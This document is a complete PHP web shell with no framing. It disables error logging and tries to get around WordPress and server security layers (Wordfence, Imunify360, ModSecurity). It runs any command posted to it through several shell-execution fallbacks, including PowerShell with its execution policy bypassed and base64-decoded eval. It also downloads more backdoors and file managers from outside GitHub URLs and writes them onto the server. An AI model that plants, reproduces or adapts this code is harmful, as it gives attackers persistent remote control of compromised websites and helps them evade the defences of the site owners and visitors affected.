<?php
session_start();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);

if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}
if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}
if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}
if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = "";

    function full_bypass($cmd) {
        $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

        if ($is_windows) {
            $bypass_cmds = [
                getenv("COMSPEC") . " /c " . $cmd,
                "for /F \"tokens=1,2 delims= \" %a in ('echo $cmd') do %a %b",
                "powershell -ExecutionPolicy Bypass -NoProfile -Command \"$cmd\"",
                str_replace(" ", "^ ", $cmd)
            ];
        } else {
            $bypass_cmds = [
                "sh -c '$cmd'",
                "bash -c '$cmd'",
                "echo ''; $cmd",
                "eval \"\$(echo '$cmd' | base64 -d)\""
            ];
        }

        foreach ($bypass_cmds as $bypass_cmd) {
            if (function_exists('shell_exec')) {
                $output = shell_exec($bypass_cmd);
            } elseif (function_exists('system')) {
                ob_start();
                system($bypass_cmd);
                $output = ob_get_clean();
            } elseif (function_exists('passthru')) {
                ob_start();
                passthru($bypass_cmd);
                $output = ob_get_clean();
            } elseif (function_exists('proc_open')) {
                $descriptorspec = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                $process = proc_open($bypass_cmd, $descriptorspec, $pipes);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                proc_close($process);
            }

            if (!empty($output)) break;
        }

        return $output;
    }

    $result = full_bypass($cmd);
}

$files = [
    "#" => "#",
	"by1.php" => "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/maw3six.php",
    "by2.php" => "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/ironman.php",
    "tfm.php" => "https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/tiny.php",
	"nebula.php" => "https://raw.githubusercontent.com/maw3six/gecko-nebula/refs/heads/main/nebulanopass.php",
];

if (isset($_POST['spawn_fm']) && isset($_POST['file_select'])) {
    $selected_file = $_POST['file_select'];

    if (array_key_exists($selected_file, $files)) {
        $url = $files[$selected_file];
        $code = file_get_contents($url);
        if ($code !== false) {
            file_put_contents($selected_file, $code);
            echo "<pre>Ok!</pre>";
        } else {
            echo "<pre>Failed!</pre>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="jp">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style> body {font-family: Arial, sans-serif;background-color: #1e1e1e;color: #fff;text-align: center;padding: 20px;}form {background: #292929;padding: 15px;margin: 10px auto;border-radius: 8px;width: 300px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);}select, input {width: 80%;padding: 8px;margin: 5px 0;border-radius: 5px;border: none;background: #3a3a3a;color: #fff;}button, input[type="submit"] {background: #007bff;color: white;padding: 8px;border: none;border-radius: 5px;cursor: pointer;}button:hover, input[type="submit"]:hover {background: #0056b3;}.terminal {font-family: "Courier New", monospace;padding: 10px;margin: 10px auto;border-radius: 5px;width: 90%;max-width: 600px;min-height: 150px;overflow: auto;box-shadow: 0 0 10px rgb(0 123 255);white-space: pre-wrap;word-wrap: break-word;text-align: left;}</style>
</head>
<body>

    <form method="POST">
        <select name="file_select">
            <?php foreach ($files as $filename => $url): ?>
                <option value="<?= htmlspecialchars($filename) ?>"><?= htmlspecialchars($filename) ?></option>
            <?php endforeach; ?>
        </select>
        <button type="submit" name="spawn_fm">Spawn</button>
    </form>

    <?php if (isset($spawn_message)): ?>
        <p style="color: #0f0;"><?= htmlspecialchars($spawn_message) ?></p>
    <?php endif; ?>

    <form method="POST">
        <input type="text" name="cmd" placeholder="Command">
        <input type="submit" value="Run">
    </form>

    <?php if (!empty($result)): ?>
        <div class="terminal"><?= htmlspecialchars($result); ?></div>
    <?php endif; ?>

</body>
</html>